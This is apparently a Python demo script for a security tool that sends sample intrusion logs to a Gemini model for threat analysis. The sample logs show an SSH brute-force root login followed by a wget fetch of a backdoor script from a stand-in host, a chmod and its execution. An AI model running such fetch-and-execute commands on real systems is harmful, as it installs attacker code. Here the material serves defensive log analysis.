#!/usr/bin/env python3
"""
ProjectLibra - LLM-Powered Threat Analysis Demo
Demonstrates AI-powered security log analysis using Gemini
"""

import asyncio
import os

print('=' * 60)
print('  ProjectLibra LLM-Powered Threat Analysis Demo')
print('=' * 60)

from src.llm import GeminiClient
from src.llm.base_client import LLMConfig

# Get API key from environment
api_key = os.environ.get('GEMINI_API_KEY')
if not api_key:
    print("\n❌ ERROR: GEMINI_API_KEY not set!")
    print("   Run: export GEMINI_API_KEY='your-key'")
    exit(1)

# Initialize Gemini client with config
config = LLMConfig(
    provider="gemini",
    api_key=api_key,
    model="gemini-2.5-flash"
)
client = GeminiClient(config)

# Sample suspicious logs to analyze
suspicious_logs = """
[2025-12-13 03:42:15] auth.log: Failed password for root from 192.168.1.105 port 22 ssh2
[2025-12-13 03:42:16] auth.log: Failed password for root from 192.168.1.105 port 22 ssh2
[2025-12-13 03:42:17] auth.log: Failed password for root from 192.168.1.105 port 22 ssh2
[2025-12-13 03:42:18] auth.log: Failed password for root from 192.168.1.105 port 22 ssh2
[2025-12-13 03:42:19] auth.log: Accepted password for root from 192.168.1.105 port 22 ssh2
[2025-12-13 03:42:25] syslog: root: TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
[2025-12-13 03:42:30] auth.log: pam_unix(sudo:session): session opened for user root
[2025-12-13 03:42:35] syslog: COMMAND=/usr/bin/wget http://malware.bad/backdoor.sh -O /tmp/b.sh
[2025-12-13 03:42:40] syslog: COMMAND=/bin/chmod +x /tmp/b.sh
[2025-12-13 03:42:45] syslog: COMMAND=/tmp/b.sh
"""

print('\n📋 SUSPICIOUS LOGS TO ANALYZE:')
print('-' * 40)
print(suspicious_logs)
print('-' * 40)

print('\n🤖 Analyzing with Gemini AI...\n')

async def analyze():
    prompt = f"""You are a cybersecurity analyst. Analyze these security logs and provide:
1. What type of attack is this?
2. What is the severity (Critical/High/Medium/Low)?
3. What actions did the attacker take?
4. What should the security team do immediately?

LOGS:
{suspicious_logs}

Provide a concise analysis."""
    
    response = await client.generate(prompt)
    return response

result = asyncio.run(analyze())

print('🔍 AI THREAT ANALYSIS:')
print('=' * 40)
if hasattr(result, 'content'):
    print(result.content)
else:
    print(result)
print('=' * 60)
